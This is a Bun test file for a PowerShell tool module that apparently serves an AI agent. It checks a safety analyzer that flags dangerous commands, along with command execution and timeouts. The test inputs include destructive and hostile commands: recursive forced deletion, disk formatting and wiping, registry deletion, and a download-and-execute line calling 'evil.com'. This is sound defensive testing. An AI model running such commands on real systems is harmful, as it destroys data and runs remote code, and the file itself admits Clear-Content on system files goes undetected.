import { describe, expect, mock, test } from "bun:test";

import { analyzePowerShellSafety, getShellArgs } from "./powershell.ts";

// ─── analyzePowerShellSafety ──────────────────────────────────

describe("analyzePowerShellSafety", () => {
  // Dangerous patterns

  test("detects Remove-Item -Recurse -Force", () => {
    const result = analyzePowerShellSafety("Remove-Item -Recurse -Force C:\\Users");
    expect(result).not.toBeNull();
    expect(result).toContain("recursive forced deletion");
  });

  test("detects Remove-Item -Force -Recurse (reversed flags)", () => {
    const result = analyzePowerShellSafety("Remove-Item -Force -Recurse C:\\temp");
    expect(result).not.toBeNull();
    expect(result).toContain("recursive forced deletion");
  });

  test("detects Remove-Item case-insensitive", () => {
    const result = analyzePowerShellSafety("remove-item -recurse -force C:\\data");
    expect(result).not.toBeNull();
  });

  test("detects Stop-Process -Force", () => {
    const result = analyzePowerShellSafety("Stop-Process -Name notepad -Force");
    expect(result).not.toBeNull();
    expect(result).toContain("forced process termination");
  });

  test("detects Format-Volume", () => {
    const result = analyzePowerShellSafety("Format-Volume -DriveLetter D -FileSystem NTFS");
    expect(result).not.toBeNull();
    expect(result).toContain("disk formatting");
  });

  test("detects Clear-Disk", () => {
    const result = analyzePowerShellSafety("Clear-Disk -Number 1 -RemoveData");
    expect(result).not.toBeNull();
    expect(result).toContain("disk wipe");
  });

  test("detects Initialize-Disk", () => {
    const result = analyzePowerShellSafety("Initialize-Disk -Number 2");
    expect(result).not.toBeNull();
    expect(result).toContain("disk initialization");
  });

  test("detects Stop-Computer", () => {
    const result = analyzePowerShellSafety("Stop-Computer -Force");
    expect(result).not.toBeNull();
    expect(result).toContain("system shutdown");
  });

  test("detects Restart-Computer", () => {
    const result = analyzePowerShellSafety("Restart-Computer -Force");
    expect(result).not.toBeNull();
    expect(result).toContain("system reboot");
  });

  test("detects Invoke-Expression", () => {
    const result = analyzePowerShellSafety("Invoke-Expression $userInput");
    expect(result).not.toBeNull();
    expect(result).toContain("arbitrary code execution");
  });

  test("detects iex alias", () => {
    const result = analyzePowerShellSafety("iex $command");
    expect(result).not.toBeNull();
    expect(result).toContain("Invoke-Expression");
  });

  test("detects Set-ExecutionPolicy Unrestricted", () => {
    const result = analyzePowerShellSafety("Set-ExecutionPolicy Unrestricted");
    expect(result).not.toBeNull();
    expect(result).toContain("disabling script safety");
  });

  test("detects Disable-WindowsOptionalFeature", () => {
    const result = analyzePowerShellSafety(
      "Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V"
    );
    expect(result).not.toBeNull();
    expect(result).toContain("disabling Windows features");
  });

  test("detects Remove-Partition", () => {
    const result = analyzePowerShellSafety("Remove-Partition -DiskNumber 1 -PartitionNumber 2");
    expect(result).not.toBeNull();
    expect(result).toContain("partition deletion");
  });

  test("detects Stop-Service -Force", () => {
    const result = analyzePowerShellSafety("Stop-Service -Name wuauserv -Force");
    expect(result).not.toBeNull();
    expect(result).toContain("forced service stop");
  });

  test("detects download-and-execute pattern", () => {
    const result = analyzePowerShellSafety(
      "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
    );
    expect(result).not.toBeNull();
    expect(result).toContain("remote script");
  });

  test("detects reg delete", () => {
    const result = analyzePowerShellSafety("reg delete HKLM\\SOFTWARE\\MyApp /f");
    expect(result).not.toBeNull();
    expect(result).toContain("registry deletion");
  });

  test("detects Remove-ItemProperty on HKLM", () => {
    const result = analyzePowerShellSafety(
      "Remove-ItemProperty -Path HKLM:\\SOFTWARE\\MyApp -Name MyValue"
    );
    expect(result).not.toBeNull();
    expect(result).toContain("system registry modification");
  });

  // Safe commands

  test("safe: Get-Process", () => {
    expect(analyzePowerShellSafety("Get-Process")).toBeNull();
  });

  test("safe: Get-ChildItem", () => {
    expect(analyzePowerShellSafety("Get-ChildItem -Path C:\\Users")).toBeNull();
  });

  test("safe: Get-Content", () => {
    expect(analyzePowerShellSafety("Get-Content -Path C:\\logs\\app.log")).toBeNull();
  });

  test("safe: Get-Service", () => {
    expect(analyzePowerShellSafety("Get-Service -Name wuauserv")).toBeNull();
  });

  test("safe: Test-Path", () => {
    expect(analyzePowerShellSafety("Test-Path C:\\Windows")).toBeNull();
  });

  test("safe: Write-Output", () => {
    expect(analyzePowerShellSafety("Write-Output 'Hello World'")).toBeNull();
  });

  test("safe: Select-Object", () => {
    expect(analyzePowerShellSafety("Get-Process | Select-Object Name, CPU")).toBeNull();
  });

  test("safe: Set-ExecutionPolicy RemoteSigned (not Unrestricted)", () => {
    expect(analyzePowerShellSafety("Set-ExecutionPolicy RemoteSigned")).toBeNull();
  });

  test("safe: Stop-Process without -Force", () => {
    expect(analyzePowerShellSafety("Stop-Process -Name notepad")).toBeNull();
  });

  test("safe: Remove-Item without -Recurse -Force combo", () => {
    expect(analyzePowerShellSafety("Remove-Item C:\\temp\\file.txt")).toBeNull();
  });

  test("safe: Stop-Service without -Force", () => {
    expect(analyzePowerShellSafety("Stop-Service -Name wuauserv")).toBeNull();
  });

  test("safe: empty command", () => {
    expect(analyzePowerShellSafety("")).toBeNull();
  });

  // Clear-Content on system files — not in the pattern list, so passes through
  test("safe: Clear-Content (not in dangerous patterns)", () => {
    expect(analyzePowerShellSafety("Clear-Content C:\\Windows\\System32\\config")).toBeNull();
  });
});

// ─── getShellArgs (command building & platform detection) ─────

describe("getShellArgs", () => {
  // We are running on Linux, so getShellArgs should return bash
  test("returns bash shell on non-Windows", () => {
    const result = getShellArgs("echo hello");
    expect(result.shell).toBe("bash");
    expect(result.args).toEqual(["-c", "echo hello"]);
  });

  test("passes command as single bash -c argument", () => {
    const cmd = "ls -la && echo done";
    const result = getShellArgs(cmd);
    expect(result.args[0]).toBe("-c");
    expect(result.args[1]).toBe(cmd);
  });

  test("handles empty command", () => {
    const result = getShellArgs("");
    expect(result.shell).toBe("bash");
    expect(result.args).toEqual(["-c", ""]);
  });

  test("handles command with special characters", () => {
    const cmd = "echo 'hello world' | grep -o 'hello'";
    const result = getShellArgs(cmd);
    expect(result.args[1]).toBe(cmd);
  });

  test("handles multiline command", () => {
    const cmd = "echo line1\necho line2";
    const result = getShellArgs(cmd);
    expect(result.args[1]).toBe(cmd);
  });
});

// ─── executePowerShell ────────────────────────────────────────

describe("executePowerShell", () => {
  // Dynamic import to test the async function
  const loadModule = async () => {
    const mod = await import("./powershell.ts");
    return mod;
  };

  test("executes simple command successfully", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "echo hello" });
    expect(result.is_error).toBe(false);
    expect(result.content).toContain("hello");
  });

  test("returns error for failing command", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "false" });
    expect(result.is_error).toBe(true);
  });

  test("captures stderr", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "echo errmsg >&2" });
    expect(result.content).toContain("errmsg");
  });

  test("respects timeout and reports timed-out", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({
      command: "sleep 30",
      timeout: 500, // 500ms — will definitely time out
    });
    expect(result.is_error).toBe(true);
    expect(result.content).toContain("TIMED OUT");
  }, 10_000);

  test("caps timeout at MAX_TIMEOUT (600000ms)", async () => {
    // We can't wait 10 minutes, but we can verify a very large timeout
    // doesn't crash — just run a fast command with oversized timeout
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({
      command: "echo ok",
      timeout: 999_999_999,
    });
    expect(result.is_error).toBe(false);
    expect(result.content).toContain("ok");
  });

  test("uses default timeout when none specified", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "echo default" });
    expect(result.is_error).toBe(false);
    expect(result.content).toContain("default");
  });

  test("handles command not found", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({
      command: "__nonexistent_command_12345__",
    });
    expect(result.is_error).toBe(true);
  });

  test("exit code 0 is not an error", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "true" });
    expect(result.is_error).toBe(false);
  });

  test("non-zero exit code is an error", async () => {
    const { executePowerShell } = await loadModule();
    const result = await executePowerShell({ command: "exit 42" });
    expect(result.is_error).toBe(true);
  });
});

// ─── powershellDefinition ─────────────────────────────────────

describe("powershellDefinition", () => {
  test("has correct name", async () => {
    const { powershellDefinition } = await import("./powershell.ts");
    expect(powershellDefinition.name).toBe("PowerShell");
  });

  test("requires command parameter", async () => {
    const { powershellDefinition } = await import("./powershell.ts");
    expect(powershellDefinition.input_schema.required).toContain("command");
  });

  test("has timeout parameter", async () => {
    const { powershellDefinition } = await import("./powershell.ts");
    expect(powershellDefinition.input_schema.properties).toHaveProperty("timeout");
  });

  test("has description parameter", async () => {
    const { powershellDefinition } = await import("./powershell.ts");
    expect(powershellDefinition.input_schema.properties).toHaveProperty("description");
  });
});
